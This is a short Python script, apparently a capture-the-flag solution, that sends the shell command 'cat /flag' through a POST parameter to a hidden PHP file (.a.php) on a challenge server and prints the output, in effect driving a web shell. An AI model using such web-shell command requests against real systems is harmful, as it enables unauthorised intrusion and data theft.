import requests

# 定义URL和数据
url = "http://8.147.134.204:35376/assets/.a.php"
data = {'game': 'cat /flag'}

# 发送POST请求
response = requests.post(url, data=data)

# 打印响应内容
print(response.text)